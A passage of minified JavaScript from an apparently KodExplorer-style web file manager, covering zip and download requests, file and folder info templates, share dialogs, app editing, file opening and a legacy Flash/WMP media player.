                })
            })
        },
        b = function(e) {
            if (core.authCheck("explorer:fileDownload") && !(1 > e.length)) {
                var a = "index.php?explorer/zipDownload";
                G.share_page !== void 0 && (a = "index.php?share/zipDownload&user=" + G.user + "&sid=" + G.sid), $.ajax({
                    url: a,
                    type: "POST",
                    dataType: "json",
                    data: n(e),
                    beforeSend: function() {
                        core.tips.loading(LNG.zip_download_ready)
                    },
                    error: core.ajaxError,
                    success: function(e) {
                        core.tips.close(e), core.tips.tips(e);
                        var a = "index.php?explorer/fileDownloadRemove&path=" + urlEncode2(e.info);
                        G.share_page !== void 0 && (a = "index.php?share/fileDownloadRemove&user=" + G.user + "&sid=" + G.sid + "&path=" + urlEncode2(e.info));
                        var t = '<iframe src="' + a + '" style="width:0px;height:0px;border:0;" frameborder=0></iframe>' + LNG.download_ready + "...",
                            i = $.dialog({
                                icon: "succeed",
                                title: !1,
                                time: 1.5,
                                content: t
                            });
                        i.DOM.wrap.find(".aui_loading").remove()
                    }
                })
            }
        },
        x = function(e, a) {
            1 > e.length || $.ajax({
                url: "index.php?explorer/zip",
                type: "POST",
                dataType: "json",
                data: n(e),
                beforeSend: function() {
                    core.tips.loading(LNG.ziping)
                },
                error: core.ajaxError,
                success: function(e) {
                    core.tips.close(e), core.tips.tips(e), "function" == typeof a && a(e)
                }
            })
        },
        k = function(e, a) {
            if (e) {
                var t = "index.php?explorer/unzip&path=" + urlEncode2(e);
                $.ajax({
                    url: t,
                    beforeSend: function() {
                        core.tips.loading(LNG.unziping)
                    },
                    error: core.ajaxError,
                    success: function(e) {
                        core.tips.close(e), "function" == typeof a && a(e)
                    }
                })
            }
        },
        N = function(e, a, t) {
            a && $.ajax({
                url: "index.php?explorer/pathCuteDrag",
                type: "POST",
                dataType: "json",
                data: n(e) + "&path=" + urlEncode2(a + "/"),
                beforeSend: function() {
                    core.tips.loading(LNG.moving)
                },
                error: core.ajaxError,
                success: function(e) {
                    core.tips.close(e), "function" == typeof t && t(e)
                }
            })
        },
        w = function(e, a, t) {
            a && $.ajax({
                url: "index.php?explorer/pathCopyDrag",
                type: "POST",
                dataType: "json",
                data: n(e) + "&path=" + urlEncode2(a + "/"),
                beforeSend: function() {
                    core.tips.loading(LNG.moving)
                },
                error: core.ajaxError,
                success: function(e) {
                    core.tips.close(e), "function" == typeof t && t(e)
                }
            })
        },
        L = function() {
            $.ajax({
                url: "index.php?explorer/clipboard",
                dataType: "json",
                error: core.ajaxError,
                success: function(e) {
                    e.code && $.dialog({
                        title: LNG.clipboard,
                        padding: 0,
                        height: 200,
                        width: 400,
                        content: e.data
                    })
                }
            })
        },
        C = function(e) {
            if (e) {
                var a = "&name=" + urlEncode(core.pathThis(e)) + "&path=" + urlEncode(e);
                core.setting("fav" + a)
            }
        },
        j = function(e) {
            var a = {};
            return a.type = e.find("input[type=radio]:checked").val(), a.content = e.find("textarea").val(), a.group = e.find("[name=group]").val(), e.find("input[type=text]").each(function() {
                var e = $(this).attr("name");
                a[e] = $(this).val()
            }), e.find("input[type=checkbox]").each(function() {
                var e = $(this).attr("name");
                a[e] = "checked" == $(this).attr("checked") ? 1 : 0
            }), a
        },
        T = function(e) {
            e.find(".type input").change(function() {
                var a = $(this).attr("apptype");
                e.find("[data-type]").addClass("hidden"), e.find("[data-type=" + a + "]").removeClass("hidden")
            })
        },
        S = function(a, t, i) {
            var n, s, o, r = LNG.app_create,
                l = UUID(),
                c = e("../tpl/app.html"),
                d = G.basic_path + "static/images/app/",
                p = template.compile(c);
            switch (void 0 == i && (i = "user_edit"), "root_edit" == i && (a = a), "user_edit" == i || "root_edit" == i ? (r = LNG.app_edit, o = p({
                LNG: LNG,
                iconPath: d,
                uuid: l,
                data: a
            })) : o = p({
                LNG: LNG,
                iconPath: d,
                uuid: l,
                data: {}
            }), $.dialog({
                fixed: !0,
                width: 450,
                id: l,
                padding: 15,
                title: r,
                content: o,
                button: [{
                    name: LNG.preview,
                    callback: function() {
                        var e = j(n);
                        return core.openApp(e), !1
                    }
                }, {
                    name: LNG.button_save,
                    focus: !0,
                    callback: function() {
                        var e = j(n);
                        switch (i) {
                            case "user_add":
                                var o = urlEncode2(G.this_path + e.name);
                                s = "./index.php?app/user_app&action=add&path=" + o;
                                break;
                            case "user_edit":
                                s = "./index.php?app/user_app&path=" + urlEncode2(a.path);
                                break;
                            case "root_add":
                                s = "./index.php?app/add&name=" + e.name;
                                break;
                            case "root_edit":
                                s = "./index.php?app/edit&name=" + e.name + "&old_name=" + a.name;
                                break;
                            default:
                        }
                        $.ajax({
                            url: s,
                            type: "POST",
                            dataType: "json",
                            data: "data=" + urlEncode2(json_encode(e)),
                            beforeSend: function() {
                                core.tips.loading()
                            },
                            error: core.ajaxError,
                            success: function(e) {
                                if (core.tips.close(e), e.code)
                                    if ("root_edit" == i || "root_add" == i) {
                                        if (!e.code) return;
                                        FrameCall.top("Openapp_store", "App.reload", '""')
                                    } else "function" == typeof t ? t() : ui.f5()
                            }
                        })
                    }
                }]
            }), n = $("." + l), G.is_root || $(".appbox .appline .right a.open").remove(), a.group && n.find("option").eq(a.group).attr("selected", 1), n.find(".aui_content").css("overflow", "inherit"), i) {
                case "user_edit":
                    n.find(".name").addClass("hidden"), n.find(".desc").addClass("hidden"), n.find(".group").addClass("hidden"), n.find("option[value=" + a.group + "]").attr("checked", !0);
                    break;
                case "user_add":
                    n.find(".desc").addClass("hidden"), n.find(".group").addClass("hidden"), n.find("[apptype=url]").attr("checked", !0), n.find("[data-type=url] input[name=resize]").attr("checked", !0), n.find("input[name=width]").attr("value", "800"), n.find("input[name=height]").attr("value", "600"), n.find("input[name=icon]").attr("value", "oexe.png");
                    break;
                case "root_add":
                    n.find("[apptype=url]").attr("checked", !0), n.find("[data-type=url] input[name=resize]").attr("checked", !0), n.find("input[name=width]").attr("value", "800"), n.find("input[name=height]").attr("value", "600"), n.find("input[name=icon]").attr("value", "oexe.png");
                    break;
                case "root_edit":
                    n.find("option[value=" + a.group + "]").attr("selected", !0);
                    break;
                default:
            }
            T(n)
        },
        z = function() {
            core.appStore()
        },
        E = function(e) {
            e && 4 > e.length && "http" != e.substring(0, 4) || $.ajax({
                url: "./index.php?app/get_url_title&url=" + e,
                dataType: "json",
                beforeSend: function() {
                    core.tips.loading()
                },
                success: function(a) {
                    var t = a.data;
                    core.tips.close(a);
                    var i = {
                            content: "window.open('" + e + "');",
                            desc: "",
                            group: "others",
                            type: "app",
                            icon: "internet.png",
                            name: t,
                            resize: 1,
                            simple: 0,
                            height: "",
                            width: ""
                        },
                        n = urlEncode2(G.this_path + t);
                    e = "./index.php?app/user_app&action=add&path=" + n, $.ajax({
                        url: e,
                        type: "POST",
                        dataType: "json",
                        data: "data=" + urlEncode2(json_encode(i)),
                        success: function(e) {
                            core.tips.close(e), e.code && ui.f5()
                        }
                    })
                }
            })
        };
    return {
        appEdit: S,
        appList: z,
        appAddURL: E,
        share: d,
        share_box: p,
        setBackground: h,
        createLink: f,
        createProject: m,
        newFile: s,
        newFolder: o,
        rname: r,
        unZip: k,
        zipDownload: b,
        zip: x,
        copy: c,
        cute: v,
        info: g,
        remove: l,
        cuteDrag: N,
        copyDrag: w,
        past: _,
        clipboard: L,
        fav: C
    }
}), define("app/tpl/fileinfo/file_info.html", [], "<div class='pathinfo'>\n    <div class='p'>\n        <div class='icon file_icon'></div>\n        <input type='text' class='info_name' name='filename' value='{{name}}'/>\n        <div style='clear:both'></div>\n    </div>\n    <div class='line'></div>\n    <div class='p'>\n        <div class='title'>{{LNG.file_type}}:</div>\n        <div class='content'>{{ext}} {{LNG.file}}</div>\n        <div style='clear:both'></div>\n    </div>\n    <div class='line'></div>\n    <div class='p'>\n        <div class='title'>{{LNG.address}}:</div>\n        <div class='content' id='id_fileinfo_path'>{{path}}</div>\n        <div style='clear:both'></div>\n    </div>\n    <div class='p'>\n        <div class='title'>{{LNG.size}}:</div>\n        <div class='content'>{{size_friendly}}  ({{size}} Byte)</div>\n        <div style='clear:both'></div>\n    </div>\n    <div class='line'></div>\n    <div class='p'>\n        <div class='title'>{{LNG.create_time}}</div>\n        <div class='content'>{{ctime}}</div>\n        <div style='clear:both'></div>\n    </div>\n    <div class='p'>\n        <div class='title'>{{LNG.modify_time}}</div>\n        <div class='content'>{{mtime}}</div>\n        <div style='clear:both'></div>\n    </div>\n    <div class='p'>\n        <div class='title'>{{LNG.last_time}}</div>\n        <div class='content'>{{atime}}</div>\n        <div style='clear:both'></div>\n    </div>\n    <div class='line'></div>\n    <div class='p'>\n        <div class='title'>{{LNG.permission}}:</div>\n        <div class='content'>{{mode}}</div>\n        <div style='clear:both'></div>\n    </div>\n    <div class='p'>\n        <div class='title'>{{LNG.permission_edit}}:</div>\n        <div class='content'><input type='text' class='info_chmod' value='777'/>\n        <button class='btn btn-default btn-sm edit_chmod' type='button'>{{LNG.button_save}}</button></div>\n        <div style='clear:both'></div>\n    </div>\n</div>"), define("app/tpl/fileinfo/path_info.html", [], "<div class='pathinfo'>\n    <div class='p'>\n        <div class='icon folder_icon'></div>\n        <input type='text' class='info_name' name='filename' value='{{name}}'/>\n        <div style='clear:both'></div>\n    </div>\n    <div class='line'></div>\n    <div class='p'>\n        <div class='title'>{{LNG.type}}:</div>\n        <div class='content'>{{LNG.folder}}</div>\n        <div style='clear:both'></div>\n    </div>\n    <div class='p'>\n        <div class='title'>{{LNG.address}}:</div>\n        <div class='content'>{{path}}</div>\n        <div style='clear:both'></div>\n    </div>\n    <div class='p'>\n        <div class='title'>{{LNG.size}}:</div>\n        <div class='content'>{{size_friendly}}  ({{size}} Byte)</div>\n        <div style='clear:both'></div>\n    </div>\n    <div class='p'>\n        <div class='title'>{{LNG.contain}}:</div> \n        <div class='content'>{{file_num}}  {{LNG.file}},{{folder_num}}  {{LNG.folder}}</div>\n        <div style='clear:both'></div>\n    </div>\n    <div class='line'></div>\n    <div class='p'>\n        <div class='title'>{{LNG.create_time}}</div>\n        <div class='content'>{{ctime}}</div>\n        <div style='clear:both'></div>\n    </div>\n    <div class='p'>\n        <div class='title'>{{LNG.modify_time}}</div>\n        <div class='content'>{{mtime}}</div>\n        <div style='clear:both'></div>\n    </div>\n    <div class='p'>\n        <div class='title'>{{LNG.last_time}}</div>\n        <div class='content'>{{atime}}</div>\n        <div style='clear:both'></div>\n    </div>\n    <div class='line'></div>\n    <div class='p'>\n        <div class='title'>{{LNG.permission}}:</div>\n        <div class='content'>{{mode}}</div>\n        <div style='clear:both'></div>\n    </div>\n    <div class='p'>\n        <div class='title'>{{LNG.permission_edit}}:</div>\n        <div class='content'><input type='text' class='info_chmod' value='777'/>\n        <button class='btn btn-default btn-sm edit_chmod' type='button'>{{LNG.button_save}}</button></div>\n        <div style='clear:both'></div>\n    </div>\n</div>"), define("app/tpl/fileinfo/path_info_more.html", [], "<div class='pathinfo'>\n    <div class='p'>\n        <div class='icon folder_icon'></div>\n        <div class='content' style='line-height:40px;margin-left:40px;'>\n            {{file_num}}  {{LNG.file}},{{folder_num}}  {{LNG.folder}}</div>\n        <div style='clear:both'></div>\n    </div>\n    <div class='line'></div>\n    <div class='p'>\n        <div class='title'>{{LNG.size}}:</div>\n        <div class='content'>{{size_friendly}} ({{size}} Byte)</div>\n        <div style='clear:both'></div>\n    </div>\n    <div class='line'></div>\n    <div class='p'>\n        <div class='title'>{{LNG.permission}}:</div>\n        <div class='content'>{{mode}}</div>\n        <div style='clear:both'></div>\n    </div>\n    <div class='p'>\n        <div class='title'>{{LNG.permission_edit}}:</div>\n        <div class='content'><input type='text' class='info_chmod' value='777'/>\n        <button class='btn btn-default btn-sm edit_chmod' type='button'>{{LNG.button_save}}</button></div>\n        <div style='clear:both'></div>\n    </div>\n</div>"), define("app/tpl/share.html", [], '<div class=\'content_box\'>\n    <div class=\'title\'>\n        <div class="titleinfo">{{LNG.share_title}}</div>\n        <div class="share_view_info"></div>\n    </div>\n    <div class=\'content_info\'>\n\n    	<div class="input_line">\n			<span class="input_title">{{LNG.share_path}}:</span>\n			<input id="share_name" type="text" name="path" value="" />\n			<div style="clear:both"></div>\n		</div>\n		<div class="input_line">\n			<span class="input_title">{{LNG.share_name}}:</span>\n			<input type="hidden" name="sid"/>\n			<input type="hidden" name="type"/>\n			<input id="share_name" type="text" placeholder="{{LNG.share_name}}" name="name"/>\n			\n			<a href="javascript:void(0);" class="share_more">{{LNG.more}}<b class="caret"></b></a>\n			<div style="clear:both"></div>\n		</div>\n\n		<div class="share_setting_more hidden">\n			<div class="input_line">\n				<span class="input_title">{{LNG.share_time}}:</span>\n				<input id="share_time" type="text" placeholder="{{LNG.share_time}}" name="time_to"/>\n				<i>{{LNG.share_time_desc}}</i>\n				<div style="clear:both"></div>\n			</div>\n			<div class="input_line">\n				<span class="input_title">{{LNG.share_password}}:</span>\n				<input type="text" placeholder="{{LNG.share_password}}" name="share_password"/>\n				<i>{{LNG.share_password_desc}}</i>\n				<div style="clear:both"></div>\n			</div>\n			<div class="input_line share_others">\n				<span class="input_title">{{LNG.others}}:</span>\n				<label class="label_code_read">\n					<input type="checkbox" name="code_read" value="">{{LNG.share_code_read}}\n				</label>\n				<label>\n					<input type="checkbox" name="not_download" value="">{{LNG.share_not_download}}\n				</label>\n				<div style="clear:both"></div>\n			</div>\n		</div>\n\n		<div class="input_line share_has_url">\n			<span class="input_title">{{LNG.share_url}}:</span>\n			<div class="input-group">\n	          <input type="text" class="share_url" aria-label="Text input with segmented button dropdown">\n	          <div class="input-group-btn">\n	            <button type="button" class="btn btn-default open_window">{{LNG.open}}</button>\n	          </div>\n	          <div class="share_jiathis_box"></div>\n	        </div>\n	        <div style="clear:both"></div>\n		</div>\n	</div>\n	<div class="share_action">		\n		<button type="button" class="btn btn-primary share_create_button">{{LNG.share_create}}</button>\n		<a type="button" href="javascript:void(0);" class="share_remove_button">{{LNG.share_cancle}}</a>\n	</div>\n</div>'), define("app/tpl/app.html", [], "<div class='appbox'>\n    <div class='appline name'>\n        <div class='left'>{{LNG.name}}</div>\n        <div class='right'><input type='text' name='name' value='{{data.name}}'/></div>\n        <div style='clear:both;'></div>\n    </div>\n    <div class='appline desc'>\n        <div class='left'>{{LNG.app_desc}}</div>\n        <div class='right'><input type='text' name='desc' value='{{data.desc}}'/></div>\n        <div style='clear:both;'></div>\n    </div>\n    <div class='appline icon'>\n        <div class='left'>{{LNG.app_icon}}</div>\n        <div class='right'><input type='text' name='icon' value='{{data.icon}}'/>\n        {{LNG.app_icon_show}}<a href='javascript:core.explorer(\"{{iconPath}}\");' class='button open'><img src='./static/images/app/computer.png'/></a></div>\n        <div style='clear:both;'></div>\n    </div>\n    <div class='appline group'>\n        <div class='left'>{{LNG.app_group}}</div>\n        <div class='right'><select name='group'>\n        <option value ='others'>{{LNG.app_group_others}}</option><option value ='game'>{{LNG.app_group_game}}</option>\n        <option value ='tools'>{{LNG.app_group_tools}}</option><option value ='reader'>{{LNG.app_group_reader}}</option>\n        <option value ='movie'>{{LNG.app_group_movie}}</option><option value ='music'>{{LNG.app_group_music}}</option>\n        </option><option value ='life'>{{LNG.app_group_life}}</option>\n        <select></div>\n        <div style='clear:both;'></div>\n    </div>\n    <div class='appline type'>\n        <div class='left'>{{LNG.app_type}}</div>\n        <div class='right'>\n            <input class='w20' type='radio' id='url{{uuid}}' apptype='url' value='url' name='{{uuid}}type' {{if data.type=='url'}}checked='checked'{{/if}}>\n            <label for='url{{uuid}}'>{{LNG.app_type_url}}</label>\n            <input class='w20' type='radio' id='app{{uuid}}' apptype='app' value='app' name='{{uuid}}type' {{if data.type=='app'}}checked='checked'{{/if}}>\n            <label for='app{{uuid}}'>{{LNG.app_type_code}}</label>\n            <input class='w20' type='radio' id='app_link{{uuid}}' apptype='app_link' value='app_link' name='{{uuid}}type' {{if data.type=='app_link'}}checked='checked'{{/if}}>\n            <label for='app_link{{uuid}}'>{{LNG.app_type_link}}</label>\n        </div>\n        <div style='clear:both;'></div>\n    </div>\n    <div class='appline' data-type='url'>\n        <div class='left'>{{LNG.app_display}}</div>\n        <div class='right'>\n            <input class='w20' type='checkbox' id='simple{{uuid}}' name='simple' {{if data.simple}}checked='true'{{/if}}>\n            <label for='simple{{uuid}}'>{{LNG.app_display_border}}</label>\n            <input class='w20' type='checkbox' id='resize{{uuid}}' name='resize' {{if data.resize}}checked='true'{{/if}}>\n            <label for='resize{{uuid}}'>{{LNG.app_display_size}}</label>\n        </div>\n        <div style='clear:both;'></div>\n    </div>\n    <div class='appline' data-type='url'>\n        <div class='left'>{{LNG.app_size}}</div>\n        <div class='right'>\n            {{LNG.width}}:&nbsp;&nbsp;<input class='w30' type='text' name='width'  value='{{data.width}}'/>\n            {{LNG.height}}:&nbsp;&nbsp;<input class='w30' type='text' name='height' value='{{data.height}}'/>\n        </div>\n        <div style='clear:both;'></div>\n    </div>\n    <div class='appline content'>\n        <div class='left hidden' data-type='app'>{{LNG.app_code}}</div>\n        <div class='left hidden' data-type='app_link'>{{LNG.app_code}}</div>\n        <div class='left' data-type='url'>{{LNG.app_url}}</div>\n        <div class='right'><textarea name='content'>{{data.content}}</textarea></div>\n        <div style='clear:both;'></div>\n    </div>\n</div>"), define("app/common/pathOpen", ["./CMPlayer"], function(e) {
    var a = function(e, a) {
            if (void 0 != e) {
                if (void 0 == a && (a = core.pathExt(e)), a = a.toLowerCase(), "folder" == a) return "explorer" == Config.pageApp ? ui.path.list(e + "/") : core.explorer(e), void 0;
                if ("oexe" != a) {
                    if (core.authCheck("explorer:fileDownload", LNG.no_permission_download)) {
                        if ("swf" == a) {
                            var n = core.path2url(e);
                            return s(n, core.ico("swf"), core.pathThis(e)), void 0
                        }
                        if ("pdf" == a) {
                            if (Config.isIE) return i(e), void 0;
                            var c = "pdf" + UUID(),
                                n = core.path2url(e),
                                d = '<div id="' + c + '" style="height:100%;">			<a href="' + n + '" target="_blank" style="display:block;margin:0 auto;margin-top:80px;font-size:16px;text-align:center;">' + LNG.error + "   " + LNG.download + " PDF</a></div>";
                            return $.dialog({
                                resize: !0,
                                fixed: !0,
                                ico: core.ico("pdf"),
                                title: core.pathThis(e),
                                width: 800,
                                height: 400,
                                padding: 0,
                                content: d
                            }), new PDFObject({
                                url: n
                            }).embed(c), void 0
                        }
                        if ("html" == a || "htm" == a) {
                            var n = core.path2url(e);
                            return s(n, core.ico("html"), core.pathThis(e)), void 0
                        }
                        if (inArray(core.filetype.image, a)) {
                            var n = urlDecode(e);
                            return -1 == e.indexOf("http:") && (n = core.path2url(n)), MaskView.image(n), void 0
                        }
                        if (inArray(core.filetype.music, a) || inArray(core.filetype.movie, a)) {
                            var n = core.path2url(e);
                            return l(n, a), void 0
                        }
                        return inArray(core.filetype.doc, a) ? (r(e), void 0) : inArray(core.filetype.text, a) || inArray(core.filetype.code, a) ? (o(e), void 0) : ("editor" == Config.pageApp ? core.tips.tips(a + LNG.edit_can_not, !1) : t(e, ""), void 0)
                    }
                } else if ("string" == typeof e || e.content && "ui.path.open" == e.content.substr(0, 12) && "app_link" == e.type) {
                    var p = e;
                    "string" != typeof e && (p = e.content.split("'")[1]), core.file_get(p, function(e) {
                        var a = json_decode(e);
                        a.name = core.pathThis(p), core.openApp(a)
                    })
                } else core.openApp(e)
            }
        },
        t = function(e, a) {
            var t = '<div class="unknow_file" style="width:260px;word-break: break-all;"><span>' + LNG.unknow_file_tips + "<br/>" + a + '</span><br/><a class="btn btn-success btn-sm" href="javascript:ui.path.download(\'' + e + "');\"> " + LNG.unknow_file_download + " </a></div>";
            $.dialog({
                fixed: !0,
                icon: "warning",
                title: LNG.unknow_file_title,
                padding: 30,
                content: t,
                cancel: !0
            })
        },
        i = function(e) {
            if (core.authCheck("explorer:fileDownload", LNG.no_permission_download) && e) {
                var a = "index.php?explorer/fileDownload&path=" + urlEncode2(e);
                G.share_page !== void 0 && (a = "index.php?share/fileDownload&user=" + G.user + "&sid=" + G.sid + "&path=" + urlEncode2(e));
                var t = '<iframe src="' + a + '" style="width:0px;height:0px;border:0;" frameborder=0></iframe>' + LNG.download_ready + "...",
                    i = $.dialog({
                        icon: "succeed",
                        title: !1,
                        time: 1,
                        content: t
                    });
                i.DOM.wrap.find(".aui_loading").remove()
            }
        },
        n = function(e) {
            if (core.authCheck("explorer:fileDownload") && void 0 != e) {
                var a = core.path2url(e);
                window.open(a)
            }
        },
        s = function(e, a, t, i) {
            if (e) {
                void 0 == i && (i = "openWindow" + UUID());
                var n = "<iframe frameborder='0' name='Open" + i + "' src='" + e + "' style='width:100%;height:100%;border:0;'></iframe>";
                art.dialog.through({
                    id: i,
                    title: t,
                    ico: a,
                    width: "78%",
                    height: "70%",
                    padding: 0,
                    content: n,
                    resize: !0
                })
            }
        },
        o = function(e) {
            if (core.authCheck("explorer:fileDownload", LNG.no_permission_download) && e) {
                var t = core.pathExt(e),
                    i = core.pathThis(e);
                if (inArray(core.filetype.bindary, t) || inArray(core.filetype.music, t) || inArray(core.filetype.image, t) || inArray(core.filetype.movie, t) || inArray(core.filetype.doc, t)) return a(e, t), void 0;
                if ("editor" == Config.pageApp) return FrameCall.child("OpenopenEditor", "Editor.add", '"' + urlEncode2(e) + '"'), void 0;
                if (void 0 == window.top.frames.OpenopenEditor) {
                    var n = "./index.php?editor/edit&filename=" + urlEncode(urlEncode2(e));
                    G.share_page !== void 0 && (n = "./index.php?share/edit&user=" + G.user + "&sid=" + G.sid + "&filename=" + urlEncode(urlEncode2(e)));
                    var o = i + " ——" + LNG.edit;
                    s(n, core.ico("edit"), o.substring(o.length - 50), "openEditor")
                } else $.dialog.list.openEditor && $.dialog.list.openEditor.display(!0), FrameCall.top("OpenopenEditor", "Editor.add", '"' + urlEncode2(e) + '"')
            }
        },
        r = function(e) {
            var a = document.domain;
            if ("" == G.office_server) {
                if (0 == a.search("localhost") || 0 == a.search("192.168.") || 0 == a.search("127.0.0")) return t(e, LNG.unknow_file_office + ', <a href="http://kalcaddle.com/help.html#office" target="_blank">' + LNG.more + ">></a>"), void 0;
                G.office_server = "https://view.officeapps.live.com/op/view.aspx?src="
            }
            if (G.share_page !== void 0) {
                var i = G.app_host + "index.php?share/fileProxy&user=" + G.user + "&sid=" + G.sid + "&path=" + urlEncode2(e),
                    n = G.office_server + urlEncode(i),
                    s = core.pathThis(e);
                art.dialog.open(n, {
                    ico: core.ico("doc"),
                    title: s,
                    width: "80%",
                    height: "70%",
                    resize: !0
                })
            } else $.get("./index.php?explorer/makeFileProxy&path=" + urlEncode(e), function(a) {
                if (0 == a.code) return core.tips.tips(a), void 0;
                var t = G.app_host + "index.php?user/public_link&fid=" + a.data,
                    i = G.office_server + urlEncode(t),
                    n = core.pathThis(e);
                art.dialog.open(i, {
                    ico: core.ico("doc"),
                    title: n,
                    width: "80%",
                    height: "70%",
                    resize: !0
                })
            })
        },
        l = function(a, t) {
            a && ("string" == typeof a && (a = [a]), CMPlayer = e("./CMPlayer"), CMPlayer.play(a, t))
        };
    return {
        open: a,
        play: l,
        openEditor: o,
        openIE: n,
        download: i
    }
}), define("app/common/CMPlayer", [], function() {
    var e = {
            ting: {
                path: "music/ting",
                width: 410,
                height: 530
            },
            beveled: {
                path: "music/beveled",
                width: 350,
                height: 200
            },
            kuwo: {
                path: "music/kuwo",
                width: 480,
                height: 200
            },
            manila: {
                path: "music/manila",
                width: 320,
                height: 400
            },
            mp3player: {
                path: "music/mp3player",
                width: 320,
                height: 410
            },
            qqmusic: {
                path: "music/qqmusic",
                width: 300,
                height: 400
            },
            somusic: {
                path: "music/somusic",
                width: 420,
                height: 137
            },
            xdj: {
                path: "music/xdj",
                width: 595,
                height: 235
            },
            webplayer: {
                path: "movie/webplayer",
                width: 600,
                height: 400
            },
            qqplayer: {
                path: "movie/qqplayer",
                width: 600,
                height: 400
            },
            tvlive: {
                path: "movie/tvlive",
                width: 600,
                height: 400
            },
            youtube: {
                path: "movie/youtube",
                width: 600,
                height: 400
            },
            vplayer: {
                path: "movie/vplayer",
                width: 600,
                height: 400
            }
        },
        a = function(e) {
            return "music" == e ? "music_player" : (void 0 == e && (e = "mp3"), inArray(core.filetype.music, e) ? "music_player" : "movie_player")
        },
        t = function(a) {
            var t, i, s, o;
            "music_player" == a ? (o = core.ico("mp3"), t = e[G.musictheme], i = "music player", s = !1) : (o = core.ico("flv"), t = e[G.movietheme], i = "movie player", s = !0);
            var r = core.createFlash(G.static_path + "js/lib/cmp4/cmp.swf", "context_menu=2&auto_play=1&play_mode=1&skin=skins/" + t.path + ".zip", a),
                l = {
                    id: a + "_dialog",
                    simple: !0,
                    ico: o,
                    title: i,
                    width: t.width + 10,
                    height: t.height,
                    content: '<div class="wmp_player"></div><div class="flash_player">' + r + "</div>",
                    resize: s,
                    padding: 0,
                    fixed: !0,
                    close: function() {
                        var e = n(a);
                        e && e.sendEvent && e.sendEvent("view_stop")
                    }
                };
            window.top.CMP ? art.dialog.through(l) : $.dialog(l)
        },
        i = function(e) {
            var a, t = "";
            for (a = e.length - 1; a >= 0; a--) {
                var i, n; - 1 == e[a].search("fileProxy") ? (i = urlEncode(e[a]), n = core.pathThis(e[a])) : (i = e[a], n = core.pathThis(urlDecode(i))), i = i.replace(/%2F/g, "/"), i = i.replace(/%3F/g, "?"), i = i.replace(/%26/g, "&"), i = i.replace(/%3A/g, ":"), i = i.replace(/%3D/g, "="), t += '<list><m type="" src="' + i + '" label="' + n + '"/></list>'
            }
            return t
        },
        n = function(e) {
            return window.top.CMP ? window.top.CMP.get(e) : CMP.get(e)
        },
        s = function(e, a) {
            var t = n(a),
                s = i(e);
            try {
                t.config("play_mode", "normal");
                var o = t.list().length;
                t.list_xml(s, !0), t.sendEvent("view_play", o + 1)
            } catch (r) {}
        },
        o = function(e) {
            if ("music_player" != e) {
                var t = n(a("movie"));
                t && (t.addEventListener("control_load", "new_play"), t.addEventListener("control_play", "new_play"))
            }
        };
    return {
        changeTheme: function(a, t) {
            var i, s, o;
            "music" == a ? (G.musictheme = t, i = "music_player") : "movie" == a && (G.movietheme = t, i = "movie_player"), o = n(i), o && (s = e[t], window.top.art.dialog.list[i + "_dialog"].size(s.width, s.height), o.sendEvent("skin_load", "skins/" + s.path + ".zip"))
        },
        play: function(e, i) {
            var r = a(i),
                l = n(r);
            if (l) s(e, r), o(r), window.top.art.dialog.list[r + "_dialog"].display(!0);
            else {
                t(r);
                var c = setInterval(function() {
                    n(r) && (s(e, r), o(r), new_play(r), clearInterval(c), c = !1)
                }, 1e3)
            }
        }
    }
});
var new_play = function(e) {
    if ("music_player" == e) return $(".music_player_dialog .wmp_player").html("").css({
        width: "0px",
        height: "0px"
    }), $(".music_player_dialog .flash_player").css({
        width: "100%",
        height: "100%"
    }), void 0;
    var a;
    a = window.top.CMP ? window.top.CMP.get("movie_player") : CMP.get("movie_player");
    var t = function(e) {
        var a = '<object id="the_wmp_player" ',
            t = navigator.userAgent;
        return -1 != t.indexOf("MSIE") ? a += 'classid="clsid:6BF52A52-394A-11d3-B153-00C04F79FAA6" ' : (-1 != t.indexOf("Firefox") || -1 != t.indexOf("Chrome") || -1 != t.indexOf("Opera") || -1 != t.indexOf("Safari")) && (a += 'type="application/x-ms-wmp" '), a += 'width="100%" height="100%">', a += '<param name="URL" value="' + e + '">', a += '<param name="autoStart" value="true">', a += '<param name="autoSize" value="true">', a += '<param name="invokeURLs" value="false">', a += '<param name="playCount" value="100">', a += '<param name="Volume" value="100">', a += '<param name="defaultFrame" value="datawindow">', a += "</object>"
    };
    try {
        var i = a.item("src").toLowerCase();
        if (i.indexOf("wmv") > 1 || i.indexOf("mpg") > 1 || i.indexOf("avi") > 1 || i.indexOf("wvx") > 1 || i.indexOf("3gp") > 1) {
            $("div[id^='DIV_CMP_']").remove();
            var n = t(i);
            $(".movie_player_dialog .wmp_player").html(""), $(".movie_player_dialog .flash_player").css({
                width: "0px",
                height: "0px"
            }), setTimeout(function() {
                $(".movie_player_dialog .wmp_player").html(n).css({
                    width: "100%",
                    height: "100%"
                })
            }, 300)
        } else $(".movie_player_dialog .wmp_player").html("").css({
            width: "0px",
            height: "0px"
        }), setTimeout(function() {
            $(".movie_player_dialog .flash_player").css({
                width: "100%",
                height: "100%"
            })
        }, 200)
    } catch (s) {}
};